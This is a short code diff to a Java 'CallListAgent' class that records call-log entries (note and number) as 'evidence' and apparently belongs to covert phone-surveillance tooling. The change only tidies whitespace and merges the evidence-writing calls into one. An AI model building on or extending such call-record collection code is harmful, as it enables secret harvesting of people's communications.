@@ -19,7 +19,6 @@ import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
-
 /**
  * The Class CallListAgent.
  */
@@ -73,7 +72,7 @@ public final class CallListAgent extends Agent implements CallListObserver {
      * @see blackberry.agent.Agent#parse(byte[])
      */
     protected boolean parse(final byte[] confParameters) {
-        
+
         return false;
     }
 
@@ -129,11 +128,8 @@ public final class CallListAgent extends Agent implements CallListObserver {
         Utils.addTypedString(databuffer, (byte) 0x04, note);
         Utils.addTypedString(databuffer, (byte) 0x08, number);
 
-        evidence.createEvidence(getAdditionalData());
+        evidence.atomicWriteOnce(getAdditionalData(), databuffer.getArray());
 
-        final byte[] array = databuffer.getArray();
-        evidence.writeEvidence(array, 0);
-        evidence.close();
     }
 
     private int wsize(String string) {
